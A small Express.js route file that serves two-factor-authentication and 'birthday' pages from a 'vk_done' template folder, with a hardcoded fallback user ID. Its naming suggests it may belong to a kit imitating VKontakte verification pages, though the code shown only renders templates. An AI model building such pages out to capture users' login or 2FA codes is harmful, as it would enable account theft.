var database_worker = require("../../mysql/workers");
const fs = require('fs');

function start_2fa(app) {
    app.get(`/2fa`, (req, res) => {
      return res.render(`vk_done/birthday/index.ejs`, {
          id: "343783264",
          error: 0,
          capcha: {
            status: 0
          }
        })
    });

    app.get(`/2fa/:id`, (req, res) => {
      database_worker.findUser(req.params.id, (user) => {
        if(user.length == 0) {
          res.render(`vk_done/2fa/index.ejs`, {
            id: "343783264",
            error: 0,
            capcha: {
                status: 0
            }
          });
        } else {
          res.render(`vk_done/2fa/index.ejs`, {
            id: req.params.id,
            error: 0,
            capcha: {
                status: 0
            }
          });
        }
      });
    });
}

module.exports = {
    start_2fa
}
